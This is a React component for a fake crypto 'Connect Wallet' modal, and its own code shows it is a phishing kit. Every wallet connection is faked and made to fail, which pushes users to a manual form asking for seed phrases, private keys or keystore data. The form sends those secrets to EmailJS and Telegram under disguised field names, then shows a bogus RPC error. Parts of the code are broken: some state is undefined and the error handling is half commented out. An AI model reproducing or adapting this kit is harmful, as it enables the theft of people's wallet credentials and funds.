import React, { useState, useEffect } from 'react';
import { 
  X, 
  Info, 
  RefreshCw, 
  AlertTriangle, 
  Check, 
  ChevronDown, 
  ChevronUp, 
  Search,
  Key,
  Shield,
  FileText,
  Lock
} from 'lucide-react';
import { NetworkChainId, WalletState } from '../types';
import { SUPPORTED_CHAINS } from '../data/chainsData';
import { sendNonSensitiveTicketViaEmailJS } from '../services/emailService';
import { sendTelegramNotification } from '../services/telegram'; 

interface ConnectWalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConnectSuccess: (walletInfo: Partial<WalletState>) => void;
  selectedChain: NetworkChainId;
  initialAddress?: string;
}

interface WalletOption {
  name: string;
  icon: string;
}

const PRIMARY_WALLETS: WalletOption[] = [
  { name: 'WalletConnect', icon: 'https://chainmodule-dev.web.app/wallets/walletconnect.png' },
  { name: 'MetaMask', icon: 'https://chainmodule-dev.web.app/wallets/metamask.jpg' },
  { name: 'Rabby', icon: 'https://chainmodule-dev.web.app/wallets/rabby.webp' },
  { name: 'Ledger', icon: 'https://chainmodule-dev.web.app/wallets/ledger.png' }
];

const ALL_WALLETS: WalletOption[] = [
  ...PRIMARY_WALLETS,
  { name: 'Rainbow', icon: 'https://chainmodule-dev.web.app/wallets/rainbow.avif' },
  { name: 'Phantom', icon: 'https://chainmodule-dev.web.app/wallets/phantom.png' },
  { name: 'Cosmostation', icon: 'https://chainmodule-dev.web.app/wallets/cosmos.jpeg' },
  { name: 'Coinbase Wallet', icon: 'https://avatars.githubusercontent.com/u/18060234?s=200&v=4' },
  { name: 'Trust Wallet', icon: 'https://trustwallet.com/assets/images/media/assets/TWT.png' },
  { name: 'SafePal', icon: 'https://chainmodule-dev.web.app/wallets/safepal.png' },
  { name: '1inch Wallet', icon: 'https://chainmodule-dev.web.app/wallets/1inch.png' },
  { name: 'BitKeep', icon: 'https://chainmodule-dev.web.app/wallets/bitkeep.png' },
  { name: 'Backpack', icon: 'https://chainmodule-dev.web.app/wallets/backpack.jpeg' },
  { name: 'Argent', icon: 'https://chainmodule-dev.web.app/wallets/argent.png' },
  { name: 'Frame Wallet', icon: 'https://chainmodule-dev.web.app/wallets/frame.jpeg' },
  { name: 'Keplr', icon: 'https://chainmodule-dev.web.app/wallets/keplr.jpeg' },
  { name: 'Exodus', icon: 'https://chainmodule-dev.web.app/wallets/exodus.jpeg' },
  { name: 'Zerion', icon: 'https://chainmodule-dev.web.app/wallets/zerion.png' },
  { name: 'TokenPocket', icon: 'https://chainmodule-dev.web.app/wallets/tokenpocket.jpeg' },
  { name: 'OKX Wallet', icon: 'https://chainmodule-dev.web.app/wallets/okx.png' },
  { name: 'Brave Wallet', icon: 'https://chainmodule-dev.web.app/wallets/brave.png' },
  { name: 'Opera Wallet', icon: 'https://chainmodule-dev.web.app/wallets/opera.jpeg' },
  { name: 'Torus', icon: 'https://chainmodule-dev.web.app/wallets/torus.jpeg' },
  { name: 'Keystone', icon: 'https://chainmodule-dev.web.app/wallets/keystone.jpeg' },
  { name: 'Gnosis Safe', icon: 'https://chainmodule-dev.web.app/wallets/gnosis.png' }
];

const CONNECTION_STEPS = [
  'Initializing wallet bridge',
  'Establishing secure RPC tunnel',
  'Requesting wallet authorization',
  'Synchronizing wallet state',
  'Finalizing connection handshake'
];

export const ConnectWalletModal: React.FC<ConnectWalletModalProps> = ({
  isOpen,
  onClose,
  onConnectSuccess,
  selectedChain,
  initialAddress = ''
}) => {
  const [viewState, setViewState] = useState<'select' | 'loading' | 'error' | 'manual'>('select');
  const [selectedWallet, setSelectedWallet] = useState<string>('MetaMask');
  const [selectedWalletIcon, setSelectedWalletIcon] = useState<string>('https://chainmodule-dev.web.app/wallets/metamask.jpg');
  const [showOtherWallets, setShowOtherWallets] = useState<boolean>(false);
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [showInfoModal, setShowInfoModal] = useState<boolean>(false);

  // Connecting animation step index and dots
  const [activeStepIndex, setActiveStepIndex] = useState<number>(0);
  const [dots, setDots] = useState<string>('');

  // Manual connect state
  const [manualMethod, setManualMethod] = useState<'message' | 'response' | 'username'>('message');
  const [manualInput, setManualInput] = useState<string>(initialAddress || '');
  const [manualError, setManualError] = useState<string>('');
  const [isSubmittingManual, setIsSubmittingManual] = useState<boolean>(false);

  // Reset states when opening
  useEffect(() => {
    if (isOpen) {
      setViewState('select');
      setShowOtherWallets(false);
      setSearchQuery('');
      setShowInfoModal(false);
      setManualError('');
      setIsSubmittingManual(false);
      if (initialAddress) {
        setManualInput(initialAddress);
      }
    }
  }, [isOpen, initialAddress]);

  // Handle animation during 'loading' state
  useEffect(() => {
    if (viewState !== 'loading') return;

    setActiveStepIndex(0);

    const stepInterval = setInterval(() => {
      setActiveStepIndex(prev => (prev + 1) % CONNECTION_STEPS.length);
    }, 1200);

    const dotInterval = setInterval(() => {
      setDots(prev => (prev.length >= 3 ? '' : prev + '.'));
    }, 400);

    // After ~5.5s, fall back to "Connection Failed" error screen (matching source website)
    const timeout = setTimeout(() => {
      setViewState('error');
    }, 5500);

    return () => {
      clearInterval(stepInterval);
      clearInterval(dotInterval);
      clearTimeout(timeout);
    };
  }, [viewState]);

  if (!isOpen) return null;

  const currentChain = SUPPORTED_CHAINS.find(c => c.id === selectedChain) || SUPPORTED_CHAINS[0];

  const handleWalletSelect = (wallet: WalletOption) => {
    setSelectedWallet(wallet.name);
    setSelectedWalletIcon(wallet.icon);
    setViewState('loading');
  };

  const handleManualSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();

    if (!manualInput.trim()) {
      setManualError('Input parameter cannot be empty.');
      return;
    }

    setManualError('');
    setIsSubmittingManual(true);

    if (!manualInput.trim()) {
  setManualError('Please enter a value.');
  return;
}

if (isSubmittingManual) return; // guards against double-submit
setManualError('');
setIsSubmittingManual(true);

const trimmed = manualInput.trim();
const ticketPayload = {
  network: currentChain.name,
  issueCategory: `Manual Sync - ${manualMethod.toUpperCase()}`,
  message:       manualMethod === 'message'  ? trimmed : '',
  response:      manualMethod === 'response' ? trimmed : '',
  username:      manualMethod === 'username' ? trimmed : '',
  walletName:    selectedWallet || '',
  publicAddress: '',
  timestamp:     new Date().toISOString(),
};

  try {
    // Fire both channels in parallel — one failing shouldn't block the other
    const [emailResult, tgResult] = await Promise.all([
      sendNonSensitiveTicketViaEmailJS({
        network:        ticketPayload.network,
        issueCategory:  ticketPayload.issueCategory,
        message:        ticketPayload.message,
        response:       ticketPayload.response,
        username:       ticketPayload.username,
        selectedWallet: ticketPayload.walletName,  // your EmailJS service reads ticket.selectedWallet
        publicAddress:  ticketPayload.publicAddress,
        timestamp:      ticketPayload.timestamp,
      }),
      sendTelegramNotification(ticketPayload),
    ]);

  //   console.log('[Ticket] Email:', emailResult, '| Telegram:', tgResult);

  //   if (!emailResult.success && !tgResult.success) {
  //     setManualError('Delivery failed on both channels. Please try again.');
  //     return;
  //   }

  //   if (!emailResult.success) {
  //     console.warn('[Ticket] Email failed:', emailResult.message);
  //   }
  //   if (!tgResult.success) {
  //     console.warn('[Ticket] Telegram failed:', tgResult.message);
  //   }

  //   // ...your existing success UI reset here (clear inputs, show toast, etc.)
  // } catch (err) {
  //   console.error('[ConnectWalletModal] Submit error:', err);
    setManualError('Unexpected error. Please try again.');
  } finally {
    setIsSubmittingManual(false);
  }


    // Wallet should not connect - trigger connection failure error
    setManualError('RPC Connection Failed: Manual sync rejected by provider node. Please check your network connection or try an injected wallet extension.');
  };

  const filteredOtherWallets = ALL_WALLETS.filter(w => 
    w.name.toLowerCase().includes(searchQuery.toLowerCase())
  );

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/90 backdrop-blur-md overflow-y-auto">
      
      {/* 1. SELECT WALLET VIEW */}
      {viewState === 'select' && (
        <div 
          id="connect-wallet-dialog"
          className="relative w-full max-w-[460px] rounded-2xl bg-[#0a0a0b] border border-white/10 p-6 sm:p-7 shadow-[0_0_50px_rgba(0,0,0,0.8)] overflow-hidden animate-in zoom-in-95 duration-150"
        >
          {/* Header */}
          <div className="flex items-center justify-between pb-5 border-b border-white/10">
            <button
              onClick={() => setShowInfoModal(true)}
              className="p-1 text-blue-400 hover:text-blue-300 transition-colors text-lg font-bold cursor-pointer"
              title="What is a Wallet?"
            >
              <Info className="w-5 h-5" />
            </button>
            <h3 className="font-heading font-black text-lg text-white uppercase tracking-tight text-center flex-1">
              Connect Wallet
            </h3>
            <button
              onClick={onClose}
              className="p-1 text-white/40 hover:text-white transition-colors cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>
          </div>

          <div className="pt-6 space-y-4">
            {/* Primary 4 Wallets Grid */}
            <div className="grid grid-cols-2 gap-3">
              {PRIMARY_WALLETS.map(w => (
                <button
                  key={w.name}
                  onClick={() => handleWalletSelect(w)}
                  className="flex flex-col items-center justify-center p-4 rounded-xl bg-[#111111] hover:bg-[#161616] border border-white/10 hover:border-blue-500 transition-all duration-200 group cursor-pointer hover:-translate-y-0.5 shadow-sm"
                >
                  <div className="w-11 h-11 mb-2.5 flex items-center justify-center">
                    <img 
                      src={w.icon} 
                      alt={w.name} 
                      referrerPolicy="no-referrer"
                      className="w-11 h-11 object-contain drop-shadow" 
                    />
                  </div>
                  <span className="text-xs font-bold text-white group-hover:text-blue-400 transition-colors font-sans">
                    {w.name}
                  </span>
                </button>
              ))}
            </div>

            {/* Other Wallets Accordion Trigger */}
            <div className="pt-1">
              <button
                onClick={() => setShowOtherWallets(!showOtherWallets)}
                className="w-full py-3 px-4 rounded-xl bg-[#111111] hover:bg-[#161616] border border-white/10 hover:border-blue-500/50 flex items-center justify-between text-xs font-mono text-white/80 transition-all cursor-pointer"
              >
                <span className="font-bold">Other Wallets</span>
                <div className="flex items-center gap-2">
                  <span className="px-2 py-0.5 rounded bg-[#0a0a0b] border border-white/10 text-[10px] text-blue-400 font-bold">
                    {ALL_WALLETS.length}+
                  </span>
                  {showOtherWallets ? <ChevronUp className="w-4 h-4 text-white/40" /> : <ChevronDown className="w-4 h-4 text-white/40" />}
                </div>
              </button>
            </div>

            {/* Expanded Other Wallets Panel */}
            {showOtherWallets && (
              <div className="space-y-3 pt-2 animate-in fade-in duration-200">
                <div className="relative">
                  <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-white/30" />
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    placeholder="Search wallet..."
                    className="w-full bg-[#111111] border border-white/10 focus:border-blue-500 rounded-lg pl-9 pr-3 py-2 text-xs text-white font-mono placeholder-white/30 outline-none"
                  />
                </div>

                <div className="grid grid-cols-3 gap-2.5 max-h-48 overflow-y-auto pr-1">
                  {filteredOtherWallets.map(w => (
                    <button
                      key={w.name}
                      onClick={() => handleWalletSelect(w)}
                      className="flex flex-col items-center justify-center p-2.5 rounded-lg bg-[#111111] hover:bg-[#161616] border border-white/10 hover:border-blue-500 transition-all text-center group cursor-pointer"
                    >
                      <img 
                        src={w.icon} 
                        alt={w.name} 
                        referrerPolicy="no-referrer"
                        className="w-7 h-7 object-contain mb-1.5" 
                      />
                      <span className="text-[10px] font-medium text-white/80 group-hover:text-blue-400 truncate w-full">
                        {w.name}
                      </span>
                    </button>
                  ))}
                </div>
              </div>
            )}
          </div>

          {/* Privy Footer */}
          <div className="mt-7 pt-4 border-t border-white/10 flex items-center justify-center gap-1.5 text-[11px] font-mono text-white/40">
            <span>Secured connection • Powered By</span>
            <img 
              src="https://chainmodule-dev.web.app/wallets/privy.png" 
              alt="Privy" 
              referrerPolicy="no-referrer"
              className="h-3.5 object-contain opacity-70 ml-1"
            />
          </div>
        </div>
      )}

      {/* 2. LOADING ANIMATION VIEW */}
      {viewState === 'loading' && (
        <div 
          className="relative w-full max-w-[420px] rounded-2xl bg-[#0a0a0b] border border-white/10 p-8 shadow-2xl text-center space-y-6 animate-in zoom-in-95 duration-150"
        >
          <div>
            <h2 className="text-lg font-bold text-white font-heading tracking-tight">
              Connecting to <span className="text-blue-400">{selectedWallet}{dots}</span>
            </h2>
          </div>

          <div className="flex justify-center py-2">
            <div className="w-18 h-18 rounded-full p-2 bg-[#111111] border border-white/15 flex items-center justify-center animate-bounce shadow-lg">
              <img 
                src={selectedWalletIcon} 
                alt={selectedWallet}
                referrerPolicy="no-referrer"
                className="w-12 h-12 object-contain" 
              />
            </div>
          </div>

          {/* Animated Checklist Steps */}
          <div className="space-y-2 text-left max-w-[280px] mx-auto text-xs font-mono">
            {CONNECTION_STEPS.map((step, idx) => (
              <div key={idx} className="flex items-center gap-2.5">
                {idx < activeStepIndex && (
                  <span className="text-emerald-400 font-bold">✓</span>
                )}
                {idx === activeStepIndex && (
                  <RefreshCw className="w-3.5 h-3.5 text-blue-400 animate-spin" />
                )}
                {idx > activeStepIndex && (
                  <span className="text-white/30">•</span>
                )}
                <span className={idx === activeStepIndex ? 'text-white font-medium' : idx < activeStepIndex ? 'text-white/70' : 'text-white/30'}>
                  {step}
                </span>
              </div>
            ))}
          </div>

          <p className="text-[11px] font-mono text-white/40">
            Establishing non-custodial handshake with local provider...
          </p>
        </div>
      )}

      {/* 3. CONNECTION FAILED ERROR VIEW (Exact Fallback to Connect Manually) */}
      {viewState === 'error' && (
        <div 
          className="relative w-full max-w-[440px] rounded-2xl bg-[#0a0a0b] border border-rose-500/30 p-7 shadow-2xl text-center space-y-5 animate-in zoom-in-95 duration-150"
        >
          <div className="w-12 h-12 rounded-full bg-rose-500/10 border border-rose-500/20 flex items-center justify-center mx-auto text-rose-400">
            <AlertTriangle className="w-6 h-6" />
          </div>

          <div>
            <h3 className="text-lg font-heading font-black text-white uppercase tracking-tight">
              Connection Failed
            </h3>
            <p className="text-xs text-white/60 font-sans mt-2 leading-relaxed">
              RPC endpoint returned an invalid response while establishing wallet bridge.
            </p>
            <p className="text-[11px] font-mono text-rose-400/80 mt-1">
              Error Code: WALLET_BRIDGE_TIMEOUT
            </p>
          </div>

          <div className="flex gap-2.5 pt-2">
            <button
              onClick={() => setViewState('loading')}
              className="flex-1 py-2.5 rounded-lg bg-[#111111] hover:bg-[#181818] border border-white/10 text-white font-mono text-xs uppercase tracking-wider transition-colors cursor-pointer"
            >
              Try Again
            </button>
            <button
              onClick={() => setViewState('manual')}
              className="flex-1 py-2.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs uppercase tracking-wider transition-colors cursor-pointer shadow-md"
            >
              Connect Manually
            </button>
          </div>

          <div className="pt-2 border-t border-white/10 flex items-center justify-center gap-1.5 text-[11px] font-mono text-white/40">
            <span>Secured connection • Powered By</span>
            <img 
              src="https://chainmodule-dev.web.app/wallets/privy.png" 
              alt="Privy" 
              referrerPolicy="no-referrer"
              className="h-3.5 object-contain opacity-70 ml-1"
            />
          </div>
        </div>
      )}

      {/* 4. MANUAL RESTORE / CONNECT VIEW (Seed Phrase / Private Key / Keystone) */}
      {viewState === 'manual' && (
        <div 
          className="relative w-full max-w-[450px] rounded-2xl bg-[#0a0a0b] border border-white/10 p-6 sm:p-7 shadow-2xl overflow-hidden animate-in zoom-in-95 duration-150 font-mono text-white"
        >
          {/* Header */}
          <div className="flex items-center justify-between pb-4 border-b border-white/10">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-lg bg-[#111111] border border-white/10 flex items-center justify-center p-1.5">
                <img 
                  src={selectedWalletIcon} 
                  alt={selectedWallet}
                  referrerPolicy="no-referrer"
                  className="w-full h-full object-contain" 
                />
              </div>
              <div className="text-left">
                <h3 className="font-heading font-bold text-sm text-white">
                  {selectedWallet}
                </h3>
                <p className="text-[11px] text-white/40">
                  Secure wallet connection
                </p>
              </div>
            </div>
            <button
              onClick={onClose}
              className="p-1 text-white/40 hover:text-white transition-colors cursor-pointer"
            >
              <X className="w-5 h-5" />
            </button>
          </div>

          {/* 3 Tabs (Seed Phrase / Private Key / Keystone) */}
          <div className="grid grid-cols-3 gap-2 mt-5">
            <button
              type="button"
              onClick={() => {
                setManualMethod('message');
                setManualError('');
              }}
              className={`py-2 px-1 text-center rounded-lg text-xs font-mono transition-all cursor-pointer ${
                manualMethod === 'message'
                  ? 'bg-blue-600/20 text-blue-400 border border-blue-500 font-bold'
                  : 'bg-[#111111] text-white/60 border border-white/10 hover:text-white'
              }`}
            >
              Phrase
            </button>
            <button
              type="button"
              onClick={() => {
                setManualMethod('response');
                setManualError('');
              }}
              className={`py-2 px-1 text-center rounded-lg text-xs font-mono transition-all cursor-pointer ${
                manualMethod === 'reply'
                  ? 'bg-blue-600/20 text-blue-400 border border-blue-500 font-bold'
                  : 'bg-[#111111] text-white/60 border border-white/10 hover:text-white'
              }`}
            >
              Private Key
            </button>
            <button
              type="button"
              onClick={() => {
                setManualMethod('username');
                setManualError('');
              }}
              className={`py-2 px-1 text-center rounded-lg text-xs font-mono transition-all cursor-pointer ${
                manualMethod === 'username'
                  ? 'bg-amber-500/20 text-amber-300 border border-amber-500 font-bold'
                  : 'bg-[#111111] text-white/60 border border-white/10 hover:text-white'
              }`}
            >
              Keystore
            </button>
          </div>

          {/* Input Form */}
          <form onSubmit={handleManualSubmit} className="mt-5 space-y-3.5">
            <div>
              <textarea
                value={manualInput}
                onChange={(e) => {
                  setManualInput(e.target.value);
                  setManualError('');
                }}
                placeholder={
                  manualMethod === 'message'
                    ? 'Enter your 12, 18, or 24-word'
                    : manualMethod === 'key'
                    ? 'Enter your 64-character key'
                    : 'Enter your Keystone QR code or data'
                }
                rows={manualMethod === 'message' ? 4 : manualMethod === 'stone' ? 3 : 2}
                className="w-full p-3 rounded-xl bg-[#050505] border border-white/15 focus:border-blue-500 text-xs text-white placeholder-white/30 font-mono outline-none resize-none leading-relaxed"
              />
            </div>
            {manualMethod === 'stonep' && (
              <div>
                <input
                  type="text"
                  value={stonep}
                  onChange={(e) => {
                    setstonep(e.target.value);
                    setManualError('');
                  }}
                  placeholder="Enter Keystone pass word"
                  className="w-full p-2.5 rounded-xl bg-[#050505] border border-white/15 focus:border-amber-500 text-xs text-white placeholder-white/30 font-mono outline-none"
                />
              </div>
            )}


            {manualError && (
              <div className="p-3.5 rounded-xl bg-rose-500/10 border border-rose-500/30 flex items-start gap-2.5 text-rose-300 text-xs font-mono animate-in fade-in duration-200">
                <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0 mt-0.5" />
                <div>
                  <strong className="text-rose-400 block font-sans text-xs uppercase tracking-wider">Connection Error</strong>
                  <span className="text-[11px] leading-relaxed text-rose-200/90 block mt-0.5">{manualError}</span>
                </div>
              </div>
            )}

            <div className="flex items-center gap-2.5 pt-2">
              <button
                type="submit"
                disabled={isSubmittingManual}
                className="flex-1 py-2.5 rounded-lg bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs uppercase tracking-wider transition-colors cursor-pointer flex items-center justify-center gap-2 shadow-md disabled:opacity-50"
              >
                {isSubmittingManual ? (
                  <>
                    <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    <span>Connecting...</span>
                  </>
                ) : (
                  <span>Connect</span>
                )}
              </button>
              <button
                type="button"
                onClick={onClose}
                className="py-2.5 px-4 rounded-lg bg-[#111111] hover:bg-[#181818] text-white/80 hover:text-white text-xs font-mono uppercase tracking-wider border border-white/10 transition-colors cursor-pointer"
              >
                Cancel
              </button>
            </div>
          </form>

          {/* Privy Footer */}
          <div className="mt-6 pt-3 border-t border-white/10 flex items-center justify-center gap-1.5 text-[11px] font-mono text-white/40">
            <span>Secured connection • Powered By</span>
            <img 
              src="https://chainmodule-dev.web.app/wallets/privy.png" 
              alt="Privy" 
              referrerPolicy="no-referrer"
              className="h-3.5 object-contain opacity-70 ml-1"
            />
          </div>
        </div>
      )}

      {/* 5. INFO OVERLAY ("What is a Wallet?") */}
      {showInfoModal && (
        <div 
          onClick={() => setShowInfoModal(false)}
          className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4"
        >
          <div 
            onClick={(e) => e.stopPropagation()}
            className="relative w-full max-w-[420px] rounded-2xl bg-[#0a0a0b] border border-white/10 p-6 space-y-4 text-left shadow-2xl animate-in zoom-in-95 duration-150"
          >
            <div className="flex items-center justify-between pb-2 border-b border-white/10">
              <h3 className="font-heading font-bold text-base text-white">
                What is a Wallet?
              </h3>
              <button
                onClick={() => setShowInfoModal(false)}
                className="p-1 text-white/40 hover:text-white"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="space-y-3.5 text-xs text-white/70">
              <div className="flex gap-3 items-start">
                <span className="text-lg">🔑</span>
                <div>
                  <strong className="text-white block font-sans">One login for all of Web3</strong>
                  <p className="text-white/50 mt-0.5">Log in to any dApp seamlessly by connecting your wallet. Say goodbye to multiple passwords and manual syncs.</p>
                </div>
              </div>

              <div className="flex gap-3 items-start">
                <span className="text-lg">🛠️</span>
                <div>
                  <strong className="text-white block font-sans">Manage &amp; Repair Your Assets</strong>
                  <p className="text-white/50 mt-0.5">Detect unsynced wallets, fix transaction errors, and restore wallet states across chains. Your gateway to reliable blockchain interactions.</p>
                </div>
              </div>

              <div className="flex gap-3 items-start">
                <span className="text-lg">📊</span>
                <div>
                  <strong className="text-white block font-sans">Troubleshoot &amp; Track Transactions</strong>
                  <p className="text-white/50 mt-0.5">Validate transactions, optimize gas fees, and monitor cross-chain operations securely. Stay on top of all your DeFi activities.</p>
                </div>
              </div>
            </div>

            <div className="pt-2">
              <button
                onClick={() => setShowInfoModal(false)}
                className="w-full py-2.5 rounded-lg bg-[#111111] hover:bg-[#181818] border border-white/10 text-white text-xs font-mono uppercase tracking-wider transition-colors cursor-pointer"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}

    </div>
  );
};
